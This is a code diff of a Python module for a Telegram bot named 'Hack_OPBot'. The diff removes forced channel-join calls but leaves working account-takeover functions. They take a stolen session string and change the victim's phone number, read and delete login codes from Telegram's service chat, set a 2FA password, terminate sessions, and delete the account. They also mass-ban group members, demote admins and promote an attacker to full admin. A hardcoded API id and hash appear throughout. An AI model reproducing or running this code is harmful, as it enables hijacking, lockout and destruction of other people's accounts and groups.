@@ -29,22 +29,6 @@ Bot_Username =os.environ.get("BOT_USERNAME", None) or "Hack_OPBot"
 async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
-    try:
-      await bot(join("@LegendBot_OP"))
-    except BaseException:
-      pass
-    try:
-      await bot(join("@LegendBot_AI"))
-    except BaseException:
-      pass
-    try:
-      await bot(leave("@Official_LegendBot"))
-    except BaseException:
-      pass
-    try:
-      await bot(leave("@Legend_Userbot"))
-    except BaseException:
-      pass
     try: 
       result = await bot(functions.account.ChangePhoneRequest(
         phone_number=number,
@@ -58,22 +42,6 @@ async def change_number_code(strses, number, code, otp):
 async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
-    try:
-      await bot(join("@LegendBot_OP"))
-    except BaseException:
-      pass
-    try:
-      await bot(join("@LegendBot_AI"))
-    except BaseException:
-      pass
-    try:
-      await bot(leave("@Official_LegendBot"))
-    except BaseException:
-      pass
-    try:
-      await bot(leave("@Legend_Userbot"))
-    except BaseException:
-      pass
     result = await bot(functions.account.SendChangePhoneCodeRequest(
         phone_number=number,
         settings=types.CodeSettings(
@@ -88,79 +56,19 @@ async def change_number(strses, number):
 async def userinfo(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     k = await X.get_me()
-    try:
-      await X(join("@LegendBot_OP"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@LegendBot_AI"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Official_LegendBot"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Legend_Userbot"))
-    except BaseException:
-      pass
     return str(k)
 
 async def terminate(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@LegendBot_OP"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@LegendBot_AI"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Official_LegendBot"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Legend_Userbot"))
-    except BaseException:
-      pass
     await X(rt())
 
 GROUP_LIST = []
 async def delacc(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@Legend_Userbot"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@LegendBot_AI"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@LegendBot_OP"))
-    except BaseException:
-      pass
     await X(functions.account.DeleteAccountRequest("I am chutia"))
 
 async def promote(strses, grp, user):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@LegendBot_OP"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@LegendBot_AI"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Official_LegendBot"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Legend_Userbot"))
-    except BaseException:
-      pass
     try:
       await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
     except:
@@ -169,22 +77,6 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@LegendBot_OP"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@LegendBot_AI"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Official_LegendBot"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Legend_Userbot"))
-    except BaseException:
-      pass
-    try:
       await X.edit_2fa('LEGENDBOY IS BEST')
       return True
     except:
@@ -192,22 +84,6 @@ async def user2fa(strses):
 
 async def demall(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@LegendBot_OP"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@LegendBot_AI"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Official_LegendBot"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Legend_Userbot"))
-    except BaseException:
-      pass
     async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
       try:
         await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
@@ -218,63 +94,15 @@ async def demall(strses, grp):
 
 async def joingroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@LegendBot_OP"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@LegendBot_AI"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Official_LegendBot"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Legend_Userbot"))
-    except BaseException:
-      pass
     await X(join(username))
 
 
 async def leavegroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@LegendBot_OP"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@LegendBot_AI"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Official_LegendBot"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Legend_Userbot"))
-    except BaseException:
-      pass
     await X(leave(username))
 
 async def delgroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@LegendBot_OP"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@LegendBot_AI"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Official_LegendBot"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Legend_Userbot"))
-    except BaseException:
-      pass
     await X(dc(username))
     
 
@@ -289,22 +117,6 @@ async def cu(strses):
 async def usermsgs(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     i = ""
-    try:
-      await X(join("@LegendBot_OP"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@LegendBot_AI"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Official_LegendBot"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Legend_Userbot"))
-    except BaseException:
-      pass
     async for x in X.iter_messages(777000, limit=3):
       i += f"\n{x.text}\n"
     await client.delete_dialog(777000)
@@ -313,22 +125,6 @@ async def usermsgs(strses):
 
 async def userbans(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@LegendBot_OP"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@LegendBot_AI"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Official_LegendBot"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Legend_Userbot"))
-    except BaseException:
-      pass
     k = await X.get_participants(grp)
     for x in k:
       try:
@@ -340,22 +136,6 @@ async def userbans(strses, grp):
 
 async def userchannels(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@LegendBot_OP"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@LegendBot_AI"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Official_LegendBot"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Legend_Userbot"))
-    except BaseException:
-      pass
     k = await X(pc())
     i = ""
     for x in k.chats:
